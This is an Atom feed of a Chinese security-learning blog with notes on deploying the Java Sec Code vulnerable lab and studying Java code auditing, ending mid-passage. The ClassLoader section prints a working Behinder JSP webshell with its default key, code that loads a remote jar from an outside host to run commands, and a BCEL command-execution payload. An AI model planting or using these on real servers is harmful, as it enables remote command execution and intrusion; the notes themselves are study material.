<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bthcls&#39;Blog</title>
  
  
  <link href="https://blog.xmszzz756.top/atom.xml" rel="self"/>
  
  <link href="https://blog.xmszzz756.top/"/>
  <updated>2024-07-17T16:24:20.265Z</updated>
  <id>https://blog.xmszzz756.top/</id>
  
  <author>
    <name>Bthcls</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java Sec Code练习</title>
    <link href="https://blog.xmszzz756.top/2024/07/17/Java%20Sec%20Code%E7%BB%83%E4%B9%A0/"/>
    <id>https://blog.xmszzz756.top/2024/07/17/Java%20Sec%20Code%E7%BB%83%E4%B9%A0/</id>
    <published>2024-07-17T14:30:09.719Z</published>
    <updated>2024-07-17T16:24:20.265Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-Sec-Code练习"><a href="#Java-Sec-Code练习" class="headerlink" title="Java Sec Code练习"></a>Java Sec Code练习</h1><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p><strong>部署</strong></p><p>我选择docker部署在本地虚拟机中，注意预留3306和8080端口</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717234528775.png" alt="image-20240717234528775"></p><p><strong>账号密码</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/admin123</span><br><span class="line">joychou/joychou123</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717234558446.png" alt="image-20240717234558446"></p><p><strong>首页</strong></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717234823041.png" alt="image-20240717234823041"></p><p><strong>介绍</strong></p><p>该项目也可以叫做Java Vulnerability Code(Java漏洞代码)。</p><p>每个漏洞类型代码默认存在安全漏洞（除非本身不存在漏洞），相关修复代码在注释里。具体可查看每个漏洞代码和注释。</p><p><strong>问题</strong></p><p>下载的是<a href="https://github.com/JoyChou93/java-sec-code/archive/refs/tags/v2.0.0.zip%EF%BC%8C2.0.0%E7%9A%84%E7%89%88%E6%9C%AC">https://github.com/JoyChou93/java-sec-code/archive/refs/tags/v2.0.0.zip，2.0.0的版本</a></p><p>docker部署后，jdbc连接报错</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240718002321976.png" alt="image-20240718002321976"></p><p>明天看看怎么解决</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-Sec-Code练习&quot;&gt;&lt;a href=&quot;#Java-Sec-Code练习&quot; class=&quot;headerlink&quot; title=&quot;Java Sec Code练习&quot;&gt;&lt;/a&gt;Java Sec Code练习&lt;/h1&gt;&lt;h2 id=&quot;开始&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="靶场练习" scheme="https://blog.xmszzz756.top/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="java漏洞" scheme="https://blog.xmszzz756.top/tags/java%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计学习</title>
    <link href="https://blog.xmszzz756.top/2024/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/"/>
    <id>https://blog.xmszzz756.top/2024/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/</id>
    <published>2024-07-16T11:33:02.941Z</published>
    <updated>2024-07-17T15:25:58.496Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java代码审计学习"><a href="#java代码审计学习" class="headerlink" title="java代码审计学习"></a>java代码审计学习</h1><h2 id="学习前的一些想法"><a href="#学习前的一些想法" class="headerlink" title="学习前的一些想法"></a>学习前的一些想法</h2><p>希望能够通过学习java代码审计，来提高自己在比赛的成绩，同时更是在实战中，java漏洞的占比很大，许多时候遇到java漏洞不会不懂利用，很难受。应该掌握java的基础知识、漏洞代码审计、能独立开发一个小的java web应用、基本的攻击方式、IDEA的debug手法。java语言我认为是比php要难搞懂的一种语言，虽然大部分语言都有相同之处，但是没有经过练习、实践，实际碰到的时候都是一头雾水，php和python的话接触的情况比较多，拿到代码也不会一头雾水，能够上手调试，寻找漏洞。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.javasec.org/">攻击Java Web应用-[Java Web安全]</a></p><p><a href="https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md">Java Sec Code</a></p><p><a href="https://cunyu1943.github.io/java-tutorial/javase/20220701-intro-to-java.html">Java 入门简介</a></p><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb?p=200&vd_source=1e6700d2fc505dca863d569459c8c8c5">黑马程序员JavaWeb开发教程，实现javaweb企业开发全流程（涵盖Spring+MyBatis+SpringMVC+SpringBoot等）</a></p><p><a href="https://www.bilibili.com/video/BV1W64y1C7N8?vd_source=1e6700d2fc505dca863d569459c8c8c5">（强烈建议观看收藏）JSP从入门到精通-Javaweb课堂从入门到实战视频教程-轻松搞定jsp</a></p><p><a href="https://www.runoob.com/jsp/jsp-syntax.html">JSP菜鸟教程</a></p><p><a href="https://www.runoob.com/java/java-intro.html">Java菜鸟教程</a></p><h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><h3 id="idea旗舰版安装"><a href="#idea旗舰版安装" class="headerlink" title="idea旗舰版安装"></a>idea旗舰版安装</h3><p>社区版支持的功能还是少了很多，这里我选择不断试用旗舰版。</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240716205520817.png" alt="image-20240716205520817"></p><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><p><strong>Hello</strong></p><p>从Hello World！开始，哈哈哈</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717213931272.png" alt="image-20240717213931272"></p><p><strong>反编译</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javap -c -l -p Main.class</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717214508439.png" alt="image-20240717214508439"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -dump &quot;Main.class&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717214651542.png" alt="image-20240717214651542"></p><p>Maven</p><p>Maven 是一个项目管理工具，包含了一个项目对象模型（<code>Project Object Model</code>），反映在配置中就是 <code>pom.xml</code> 文件。其中包含了一个项目的生命周期、一个依赖管理系统，以及定义在项目生命周期阶段的插件（<code>plugin</code>）和目标（<code>goal</code>）。</p><p>其中 Maven 最核心的两大概念包括 <strong>依赖管理</strong> 和 <strong>项目构建</strong>。</p><ul><li><strong>依赖管理</strong>：提供对 <code>jar</code> 的统一管理。（Maven 提供了一个中央仓库，当我们在项目中添加完依赖后，Maven 就会自动去中央仓库中下载相关依赖）。</li><li><strong>项目构建</strong>：Maven 提供对项目的编译、测试、打包、部署、上传到私服等。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240716221836444.png" alt="image-20240716221836444"></p><p><strong>命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn archetype:generate 初始化</span><br><span class="line">mvn compile 编译</span><br><span class="line">mvn test 运行测试</span><br><span class="line">mvn package 打包</span><br><span class="line">mvn install 安装到本地</span><br><span class="line">mvn deploy 部署到远程仓库</span><br><span class="line">mvn exec:java 运行</span><br><span class="line">mvn clean 清理</span><br><span class="line">mvn update 更新依赖</span><br><span class="line">mvn site 生成文档</span><br><span class="line">mvn report 生成报告</span><br></pre></td></tr></table></figure><p><strong>结构</strong></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717091820638.png" alt="image-20240717091820638"></p><p><strong>Spring Boot</strong></p><p>Spring Boot 是一个开源的 Java 基础框架，它使得创建独立的、生产级的基于 Spring 框架的应用程序变得非常容易。Spring Boot 可以自动配置你的 Spring 应用程序，让你快速启动和运行 Spring 应用程序。</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717100448150.png" alt="image-20240717100448150"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717100502433.png" alt="image-20240717100502433"></p><p><strong>Tomcat</strong></p><p>Tomcat 是一个开源的 Java Servlet 容器，由 Apache 软件基金会维护。它实现了 Java Servlet 和 JavaServer Pages (JSP) 技术，提供了一个运行 Java Web 应用程序的平台。</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717101006239.png" alt="image-20240717101006239"></p><h3 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>Java 是Java 面向对象程序设计语言和 Java 平台的总称。</p><p>Java分为三个体系：</p><ul><li>JavaSE（J2SE）（Java2 Platform Standard Edition，java平台标准版）</li><li>JavaEE   (J2EE)     (Java 2 Platform,Enterprise Edition，java平台企业版)</li><li>JavaME  (J2ME)    (Java 2 Platform Micro Edition，java平台微型版)。</li></ul><p>Java作为一种面向对象语言。支持以下基本概念：</p><ul><li><strong>对象</strong>：对象是类的一个实例（<strong>对象不是找个女朋友</strong>），有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</li><li><strong>类</strong>：类是一个模板，它描述一类对象的行为和状态。</li></ul><h4 id="ClassLoader（类加载机制）"><a href="#ClassLoader（类加载机制）" class="headerlink" title="ClassLoader（类加载机制）"></a><a href="https://www.javasec.org/javase/ClassLoader/#classloader%EF%BC%88%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%EF%BC%89">ClassLoader（类加载机制）</a></h4><h5 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h5><p>使用自定义类加载器重写<code>findClass</code>方法，然后在调用<code>defineClass</code>方法的时候传入<code>TestHelloWorld</code>类的字节码的方式来向JVM中定义一个<code>TestHelloWorld</code>类，最后通过反射机制就可以调用<code>TestHelloWorld</code>类的<code>hello</code>方法了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">/**</span><br><span class="line"> * Creator: yz</span><br><span class="line"> * Date: 2019/12/17</span><br><span class="line"> * ReWriter: bthcls</span><br><span class="line"> * Date: 2024/7/17</span><br><span class="line"> */</span><br><span class="line">public class Main extends ClassLoader &#123;</span><br><span class="line"></span><br><span class="line">    // TestHelloWorld类名</span><br><span class="line">    private static String testClassName = &quot;com.anbai.sec.classloader.TestHelloWorld&quot;;</span><br><span class="line"></span><br><span class="line">    // TestHelloWorld类字节码</span><br><span class="line">    private static byte[] testClassBytes = new byte[]&#123;</span><br><span class="line">            -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,</span><br><span class="line">            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,</span><br><span class="line">            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,</span><br><span class="line">            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,</span><br><span class="line">            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,</span><br><span class="line">            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,</span><br><span class="line">            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,</span><br><span class="line">            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,</span><br><span class="line">            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,</span><br><span class="line">            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,</span><br><span class="line">            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,</span><br><span class="line">            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,</span><br><span class="line">            0, 0, 0, 2, 0, 12</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        // 只处理TestHelloWorld类</span><br><span class="line">        if (name.equals(testClassName)) &#123;</span><br><span class="line">            // 调用JVM的native方法定义TestHelloWorld类</span><br><span class="line">            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return super.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 创建自定义的类加载器</span><br><span class="line">        Main loader = new Main();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            // 使用自定义的类加载器加载TestHelloWorld类</span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span><br><span class="line">            Object testInstance = testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            // 反射获取hello方法</span><br><span class="line">            Method method = testInstance.getClass().getMethod(&quot;hello&quot;);</span><br><span class="line"></span><br><span class="line">            // 反射调用hello方法,等价于 String str = t.hello();</span><br><span class="line">            String str = (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出字节码到BytesToHex.class，反编译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        byte[] classBytes = new byte[]&#123;</span><br><span class="line">                -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,</span><br><span class="line">                16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,</span><br><span class="line">                101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,</span><br><span class="line">                1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,</span><br><span class="line">                97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,</span><br><span class="line">                101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,</span><br><span class="line">                114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,</span><br><span class="line">                32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,</span><br><span class="line">                115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,</span><br><span class="line">                116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,</span><br><span class="line">                97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,</span><br><span class="line">                0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,</span><br><span class="line">                1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,</span><br><span class="line">                0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,</span><br><span class="line">                0, 0, 0, 2, 0, 12</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        try (FileOutputStream fos = new FileOutputStream(&quot;ByteToHex.class&quot;)) &#123;</span><br><span class="line">            fos.write(classBytes);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717224859489.png" alt="image-20240717224859489"></p><p>利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象</p><p><strong>示例 - 冰蝎JSP后门：</strong></p><p>以<code>冰蝎</code>为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的<code>equals</code>方法实现恶意攻击，其中<code>equals</code>方法传入的<code>pageContext</code>对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line"></span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if (request.getMethod().equals(&quot;POST&quot;)) &#123;</span><br><span class="line">        String k = &quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br><span class="line">        session.putValue(&quot;u&quot;, k);</span><br><span class="line">        Cipher c = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h5><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>，<code>URLClassLoader</code>提供了加载远程资源的能力，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p><p><strong>TestURLClassLoader.java示例：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://anbai.io/tools/cmd.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">ucl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;ls&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cmdClass</span> <span class="operator">=</span> ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            <span class="type">InputStream</span>           <span class="variable">in</span>   <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程的<code>cmd.jar</code>中就一个<code>CMD.class</code>文件，对应的编译之前的代码片段如下：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Creator: yz</span><br><span class="line"> * <span class="built_in">Date</span>: <span class="number">2019</span>/<span class="number">12</span>/<span class="number">18</span></span><br><span class="line"> */</span><br><span class="line">public class <span class="built_in">CMD</span> &#123;</span><br><span class="line"></span><br><span class="line">    public static Process exec(String <span class="built_in">cmd</span>) throws IOException &#123;</span><br><span class="line">        return Runtime.getRuntime().exec(<span class="built_in">cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译CMD.java，打包CMD.class（这里打包错了，应该只打包CMD.class）</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717230609910.png" alt="image-20240717230609910"></p><p>放到vps，开始远程实验</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240717231514315.png" alt="image-20240717231514315"></p><h5 id="跨类加载器加载"><a href="#跨类加载器加载" class="headerlink" title="跨类加载器加载"></a>跨类加载器加载</h5><p>暂时没搞懂</p><h5 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h5><p><a href="https://commons.apache.org/proper/commons-bcel/">BCEL</a>（<code>Apache Commons BCEL™</code>）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名<code>org.apache.bcel.util.ClassLoader</code>为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，BCEL的类加载器在解析类名时会对ClassName中有<code>$$BCEL$$</code>标识的类做特殊处理，该特性经常被用于编写各类攻击Payload。</p><p><strong>BCEL攻击原理</strong></p><p>当BCEL的<code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code>加载一个类名中带有<code>$$BCEL$$</code>的类时会截取出<code>$$BCEL$$</code>后面的字符串，然后使用<code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code>将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用<code>defineClass</code>注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击Payload中。</p><p><strong>兼容性问题</strong></p><p>BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始<code>org.apache.bcel.classfile.ConstantUtf8#setBytes</code>就已经过时了，如下：</p><p>Oracle自带的BCEL是修改了原始的包名，因此也有兼容性问题，已知支持该特性的JDK版本为：<code>JDK1.5 - 1.7</code>、<code>JDK8 - JDK8u241</code>、<code>JDK9</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCELClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osName</span>  <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;calc 12345678901234567&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Linux&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;curl localhost:9999/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用BCEL编码com.anbai.sec.classloader.TestBCELClass类字节码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将一个Class文件编码成BCEL类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classFile Class文件路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 编码后的BCEL类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 文件读取异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bcelEncode</span><span class="params">(File classFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(FileUtils.readFileToByteArray(classFile), <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>暂时没有jdk环境</p><h5 id="Xalan-ClassLoader"><a href="#Xalan-ClassLoader" class="headerlink" title="Xalan ClassLoader"></a>Xalan ClassLoader</h5><p>Xalan和BCEL一样都经常被用于编写反序列化Payload，Oracle 